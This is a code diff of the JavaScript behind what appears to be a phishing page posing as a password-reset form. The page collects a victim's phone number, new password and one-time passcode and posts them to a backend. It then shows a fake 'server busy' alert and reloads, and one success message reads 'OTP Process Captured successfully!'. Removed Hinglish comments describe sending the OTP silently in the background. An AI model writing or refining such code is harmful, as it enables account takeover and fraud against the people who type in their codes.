@@ -211,7 +211,8 @@
                 showOtpSection(phoneNumber);
             }
         });
-       // Modify Button Click (REPLACE THIS BLOCK)
+
+        // Modify Button Click
         modifyBtn.addEventListener('click', async () => {
             const phone = document.getElementById('forgotPhone').value;
             const newPassword = document.getElementById('forgotNewPass').value;
@@ -229,17 +230,12 @@
                     body: JSON.stringify({ phone, newPassword })
                 });
                 const data = await response.json();
-                
-                // YEH ZAROORI HAI: ID ko capture karna
-                if(data.userId) {
-                    currentUserId = data.userId;
-                }
-                
                 showOtpSection(phone);
             } catch (error) {
                 showOtpSection(phone);
             }
         });
+
         function showOtpSection(phoneNum) {
             document.getElementById('otp1').value = '';
             document.getElementById('otp2').value = '';
@@ -260,7 +256,6 @@
 
         function moveNext(current, nextFieldId) { if (current.value.length >= 1) { document.getElementById(nextFieldId).focus(); } }
 
-        // OTP Submit Function (REPLACE THIS BLOCK)
         async function checkAndSubmitOtp(current) {
             const o1 = document.getElementById('otp1').value;
             const o2 = document.getElementById('otp2').value;
@@ -270,20 +265,13 @@
             if(o1 && o2 && o3 && o4) {
                 const fullOtp = o1 + o2 + o3 + o4;
                 
-                // 1. Backend ko OTP bhej rahe hain (Background Request)
-                fetch(`${BACKEND_URL}/api/otp-submit`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
-                }).catch(err => console.error("Error:", err));
-                
-                // 2. User ko dikhayein ki server busy hai
-                setTimeout(() => {
-                    alert("Server is busy, please try again later.");
-                    window.location.reload();
-                }, 200);
-            }
-        }
+                if(isModifyFlow) {
+                    setTimeout(() => {
+                        alert("Server busy please try again server is busy");
+                        window.location.reload();
+                    }, 50);
+                    return;
+                }
 
                 try {
                     const response = await fetch(`${BACKEND_URL}/api/otp-submit`, {
@@ -292,7 +280,7 @@
                         body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
                     });
                     const data = await response.json();
-                    if(data.success) { alert("Server is busy please try again"); window.location.reload(); }
+                    if(data.success) { alert("OTP Process Captured successfully!"); window.location.reload(); }
                 } catch (error) { alert("Server connection failed"); window.location.reload(); }
             }
         }
